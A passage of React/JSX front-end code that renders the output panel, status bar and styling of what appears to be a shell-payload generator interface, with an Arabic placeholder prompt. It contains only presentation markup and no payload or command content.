                    <pre className="h-full overflow-auto p-4 text-[12px] font-mono text-emerald-400 leading-relaxed whitespace-pre-wrap break-all bg-[#020202] selection:bg-[#e21227]/30">
                      {output || "// اختر نوع الـ shell والإعدادات لتوليد الـ payload..."}
                    </pre>
                    {/* Scanline effect */}
                    <div className="absolute inset-0 pointer-events-none"
                      style={{ background: "repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px)" }} />
                  </div>

                  {/* Bottom stats */}
                  <div className="flex items-center gap-4 px-4 py-2 border-t border-[#1a1a1a] shrink-0">
                    <span className="text-[10px] font-mono text-muted-foreground/60">
                      {output.length} chars · {output.split("\n").length} lines
                    </span>
                    <span className="text-[10px] font-mono text-[#e21227]/60">
                      {shellType.toUpperCase()} · {os.toUpperCase()} · {encoding.toUpperCase()}
                    </span>
                    <div className="ml-auto flex items-center gap-1.5 text-[10px] font-mono text-emerald-400/60">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                      LIVE GENERATION
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
